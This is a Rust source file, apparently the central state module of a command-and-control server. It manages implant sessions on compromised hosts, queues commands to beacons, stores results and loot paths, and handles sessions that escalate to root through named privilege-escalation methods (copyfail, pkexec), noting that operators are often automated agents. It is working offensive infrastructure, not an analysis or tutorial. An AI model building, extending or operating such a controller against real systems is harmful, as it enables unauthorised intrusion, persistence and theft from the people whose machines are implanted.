/// Global C2 server state — sessions, commands, events, dynamic listeners.
use crate::models::*;
use std::collections::{HashMap, VecDeque};
use std::path::PathBuf;
use tokio::sync::{broadcast, RwLock};

const MAX_COMMANDS_PER_BEACON: usize = 10;
const MAX_COMMAND_HISTORY: usize = 500;

/// Handle to a running beacon listener so we can stop it later.
pub struct ListenerHandle {
    pub protocol: String,
    pub abort: tokio::sync::oneshot::Sender<()>,
}

/// Outcome of a session check-in — distinguishes a brand-new session from a
/// privilege escalation (same session, uid became 0).
pub enum SessionUpdate {
    New,
    Existing,
    Escalated { from_uid: u32 },
}

pub struct AppState {
    /// All implant sessions keyed by implant_id.
    pub sessions: RwLock<HashMap<String, ImplantSession>>,

    /// Per-implant command queues.
    pub command_queues: RwLock<HashMap<String, VecDeque<PendingCommand>>>,

    /// Per-implant command history.
    pub command_history: RwLock<HashMap<String, Vec<CommandRecord>>>,

    /// Broadcast channel for WebSocket event subscribers.
    pub event_tx: broadcast::Sender<C2Event>,

    /// Active beacon listeners (port → handle).
    pub listeners: RwLock<HashMap<u16, ListenerHandle>>,

    /// TLS certificate paths.
    pub cert_path: PathBuf,
    pub key_path: PathBuf,

    /// Legacy log file paths.
    pub beacon_log: PathBuf,
    pub loot_file: PathBuf,
    pub all_log: PathBuf,
}

impl AppState {
    pub fn new(
        beacon_log: PathBuf,
        loot_file: PathBuf,
        all_log: PathBuf,
        cert_path: PathBuf,
        key_path: PathBuf,
    ) -> Self {
        let (event_tx, _) = broadcast::channel(256);
        AppState {
            sessions: RwLock::new(HashMap::new()),
            command_queues: RwLock::new(HashMap::new()),
            command_history: RwLock::new(HashMap::new()),
            event_tx,
            listeners: RwLock::new(HashMap::new()),
            cert_path,
            key_path,
            beacon_log,
            loot_file,
            all_log,
        }
    }

    // ── Session management ──────────────────────────────────────────

    pub async fn ensure_session(
        &self, implant_id: &str, hostname: &str, ip: &str,
        tier: &str, os: &str, arch: &str, uid: u32, protocol_version: u32,
    ) -> SessionUpdate {
        let mut sessions = self.sessions.write().await;
        if let Some(s) = sessions.get_mut(implant_id) {
            let prev_uid = s.uid;
            s.update_seen(ip.to_string());
            s.update_metadata(Some(os.to_string()), Some(arch.to_string()), Some(uid), Some(tier.to_string()));
            // Privilege escalation: the same session (same implant_id) just
            // checked in as root where it previously wasn't. This happens when
            // privesc re-execs the implant as root (copyfail replaces the
            // process image; pkexec spawns a root child and the parent exits).
            // The pre-escalation process is gone, so any commands it was still
            // holding (Sent, unresolved) are orphaned — resolve them so an
            // operator (often an automated agent) isn't left polling forever.
            if prev_uid != 0 && uid == 0 {
                SessionUpdate::Escalated { from_uid: prev_uid }
            } else {
                SessionUpdate::Existing
            }
        } else {
            let session = ImplantSession::new(
                implant_id.to_string(), hostname.to_string(), ip.to_string(),
                tier.to_string(), os.to_string(), arch.to_string(), uid, protocol_version,
            );
            sessions.insert(implant_id.to_string(), session);
            SessionUpdate::New
        }
    }

    /// Resolve the command bookkeeping after a session escalates to root.
    ///
    /// - Completes the outstanding `privesc` command (the one that triggered
    ///   escalation) with a synthesized success result. Needed for copyfail,
    ///   which replaces the process via execl before it can post a result.
    /// - Marks any other `Sent` (delivered-but-unresolved) commands as
    ///   `superseded_by_escalation` — the process that received them is gone,
    ///   so they will never get real results.
    ///
    /// For pkexec this is a safe no-op in the common case: the unprivileged
    /// parent posts its own results before exiting, so by the time the root
    /// child triggers this, nothing is `Sent`. If a late parent result arrives
    /// afterward, `store_result` overwrites the synthesized status — so real
    /// results always win.
    pub async fn resolve_escalation(&self, implant_id: &str, from_uid: u32) {
        let mut history = self.command_history.write().await;
        let entries = history.entry(implant_id.to_string()).or_insert_with(Vec::new);
        let now = chrono::Utc::now();
        let mut events: Vec<(String, String)> = Vec::new();

        // Complete the most recent outstanding privesc command (reverse search).
        for record in entries.iter_mut().rev() {
            if record.status == CommandStatus::Sent && record.module == "privesc" {
                record.status = CommandStatus::Completed;
                record.completed_at = Some(now);
                record.result = Some(serde_json::json!({
                    "success": true,
                    "escalated": true,
                    "from_uid": from_uid,
                    "new_uid": 0u32,
                    "note": "session escalated to root; continuing under the same session id",
                }));
                events.push((record.id.clone(), "completed".into()));
                break;
            }
        }

        // Orphaned commands the pre-escalation process never resolved.
        for record in entries.iter_mut() {
            if record.status == CommandStatus::Sent {
                record.status = CommandStatus::Failed;
                record.completed_at = Some(now);
                record.result = Some(serde_json::json!({
                    "error": "superseded_by_escalation",
                    "note": "process was replaced during privilege escalation; command did not complete",
                }));
                events.push((record.id.clone(), "failed".into()));
            }
        }

        while entries.len() > MAX_COMMAND_HISTORY { entries.remove(0); }
        drop(history);

        for (command_id, status) in events {
            let _ = self.event_tx.send(C2Event::CommandResult {
                implant_id: implant_id.to_string(),
                command_id,
                status,
            });
        }
    }

    pub async fn get_session(&self, implant_id: &str) -> Option<ImplantSession> {
        self.sessions.read().await.get(implant_id).cloned()
    }

    pub async fn list_sessions(&self) -> Vec<ImplantSession> {
        self.sessions.read().await.values().cloned().collect()
    }

    pub async fn remove_session(&self, implant_id: &str) -> bool {
        self.sessions.write().await.remove(implant_id).is_some()
    }

    // ── Command queue management ────────────────────────────────────

    pub async fn queue_command(&self, implant_id: &str, cmd: PendingCommand) -> Result<QueueCommandResponse, String> {
        {
            let sessions = self.sessions.read().await;
            if !sessions.contains_key(implant_id) {
                return Err(format!("session {} not found", implant_id));
            }
        }
        let response = QueueCommandResponse {
            command_id: cmd.id.clone(),
            module: cmd.module.clone(),
            action: cmd.action.clone(),
            status: "pending".to_string(),
        };
        let mut queues = self.command_queues.write().await;
        let queue = queues.entry(implant_id.to_string()).or_insert_with(VecDeque::new);
        queue.push_back(cmd);
        {
            let mut sessions = self.sessions.write().await;
            if let Some(s) = sessions.get_mut(implant_id) {
                s.pending_commands = queue.len();
            }
        }
        let _ = self.event_tx.send(C2Event::CommandQueued {
            implant_id: implant_id.to_string(),
            command_id: response.command_id.clone(),
            module: response.module.clone(),
        });
        Ok(response)
    }

    pub async fn dequeue_commands(&self, implant_id: &str) -> Vec<PendingCommand> {
        let mut queues = self.command_queues.write().await;
        let queue = match queues.get_mut(implant_id) {
            Some(q) => q,
            None => return Vec::new(),
        };
        let count = queue.len().min(MAX_COMMANDS_PER_BEACON);
        let mut commands: Vec<PendingCommand> = Vec::with_capacity(count);
        for _ in 0..count {
            if let Some(mut cmd) = queue.pop_front() {
                cmd.mark_sent();
                let _ = self.event_tx.send(C2Event::CommandSent {
                    implant_id: implant_id.to_string(),
                    command_id: cmd.id.clone(),
                });
                commands.push(cmd);
            }
        }
        // Write history BEFORE releasing lock to prevent race with result handler
        {
            let mut history = self.command_history.write().await;
            let entries = history.entry(implant_id.to_string()).or_insert_with(Vec::new);
            for cmd in &commands {
                entries.push(CommandRecord::from(cmd.clone()));
            }
        }
        {
            let mut sessions = self.sessions.write().await;
            if let Some(s) = sessions.get_mut(implant_id) {
                s.pending_commands = queue.len();
                s.total_commands += commands.len() as u64;
            }
        }
        commands
    }

    pub async fn cancel_command(&self, implant_id: &str, command_id: &str) -> bool {
        let mut queues = self.command_queues.write().await;
        if let Some(queue) = queues.get_mut(implant_id) {
            if let Some(pos) = queue.iter().position(|c| c.id == command_id) {
                queue.remove(pos);
                return true;
            }
        }
        false
    }

    // ── Result management ───────────────────────────────────────────

    pub async fn store_result(&self, implant_id: &str, result: CommandResultData) {
        let mut history = self.command_history.write().await;
        let entries = history.entry(implant_id.to_string()).or_insert_with(Vec::new);
        let cmd_id = result.command_id.clone().unwrap_or_else(|| "unknown".into());
        let status = result.status.clone().unwrap_or_else(|| "completed".into());
        if let Some(record) = entries.iter_mut().find(|r| r.id == cmd_id) {
            record.completed_at = Some(chrono::Utc::now());
            record.status = if status == "completed" { CommandStatus::Completed } else { CommandStatus::Failed };
            record.result = result.data.clone();
        } else {
            entries.push(CommandRecord {
                id: cmd_id.clone(), module: "unknown".into(), action: "execute".into(),
                args: serde_json::Value::Null, created_at: chrono::Utc::now(),
                delivered_at: None, completed_at: Some(chrono::Utc::now()),
                status: if status == "completed" { CommandStatus::Completed } else { CommandStatus::Failed },
                result: result.data,
            });
        }
        while entries.len() > MAX_COMMAND_HISTORY { entries.remove(0); }
        let _ = self.event_tx.send(C2Event::CommandResult {
            implant_id: implant_id.to_string(), command_id: cmd_id, status,
        });
    }

    pub async fn get_command_history(&self, implant_id: &str) -> Vec<CommandRecord> {
        self.command_history.read().await.get(implant_id).cloned().unwrap_or_default()
    }

    pub async fn get_command(&self, implant_id: &str, command_id: &str) -> Option<CommandRecord> {
        self.command_history.read().await
            .get(implant_id)
            .and_then(|entries| entries.iter().find(|r| r.id == command_id).cloned())
    }

    // ── Event broadcast ─────────────────────────────────────────────

    pub fn broadcast_event(&self, event: C2Event) {
        let _ = self.event_tx.send(event);
    }
}
